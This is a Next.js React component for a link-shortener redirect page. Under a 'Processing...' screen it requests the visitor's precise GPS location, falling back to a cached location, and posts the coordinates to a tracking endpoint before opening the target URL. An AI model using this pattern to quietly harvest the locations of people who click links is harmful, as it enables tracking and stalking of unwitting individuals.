'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { Loader2, ExternalLink } from 'lucide-react';

export default function RedirectLogic({ shortCode, originalUrl }: { shortCode: string, originalUrl: string }) {
    const router = useRouter();
    const [status, setStatus] = useState('Initializing...');
    const [isBlocked, setIsBlocked] = useState(false);
    const processingRef = useRef(false);

    // Helper to get position with specific options
    const getPosition = (options: PositionOptions): Promise<GeolocationPosition> => {
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, options);
        });
    };

    const trackLocation = async () => {
        if (processingRef.current) return;
        processingRef.current = true;

        let locationData = {};

        if ('geolocation' in navigator) {
            try {
                setStatus('Requesting precise location...');
                // Attempt 1: High Accuracy (GPS) - 3s timeout
                const position = await getPosition({
                    enableHighAccuracy: true,
                    timeout: 3000,
                    maximumAge: 0
                });

                locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };
            } catch (e1) {
                console.warn('High accuracy geolocation failed:', e1);

                try {
                    setStatus('Requesting approximate location...');
                    // Attempt 2: Low Accuracy (WiFi/Cell/Cached) - 3s timeout
                    const position = await getPosition({
                        enableHighAccuracy: false,
                        timeout: 3000,
                        maximumAge: Infinity // Accept cached positions
                    });

                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                } catch (e2) {
                    console.warn('Low accuracy geolocation failed:', e2);
                    // Fallback to IP-based location (handled by server)
                }
            }
        }

        setStatus('Redirecting...');

        // Send tracking data using keepalive so it survives redirection/tab close
        try {
            await fetch('/api/track', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    shortCode,
                    ...locationData,
                }),
                keepalive: true,
            });
            setStatus('Redirected');
        } catch {
            // Ignore
        }
    };

    const handleRedirect = () => {
        // Try to open in new tab
        const newWindow = window.open(originalUrl, '_blank');
        if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
            setIsBlocked(true);
            setStatus('Popup blocked. Please click to open.');
        } else {
            setStatus('Link opened in a new tab...');
        }
    };

    useEffect(() => {
        // Start tracking immediately
        trackLocation();

        // Attempt redirect immediately
        handleRedirect();
    }, [shortCode, originalUrl]);

    if (isBlocked) {
        return (
            <div className="min-h-screen bg-[#0f1014] flex flex-col items-center justify-center text-white p-4">
                <button
                    onClick={() => window.open(originalUrl, '_blank')}
                    className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-semibold transition-all animate-pulse"
                >
                    <ExternalLink className="w-5 h-5" />
                    Click to Open Link
                </button>
                <p className="text-gray-400 text-sm mt-4">Popup was blocked. Click above to continue.</p>
                <p className="text-gray-500 text-xs mt-2">{status}</p>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#0f1014] flex flex-col items-center justify-center text-white p-4">
            <Loader2 className="w-10 h-10 animate-spin text-blue-500 mb-4" />
            <h1 className="text-xl font-semibold mb-2">Processing...</h1>
            <p className="text-gray-400 text-sm animate-pulse">{status}</p>
            <p className="text-gray-500 text-xs mt-8">Please keep this tab open while we redirect you.</p>
        </div>
    );
}
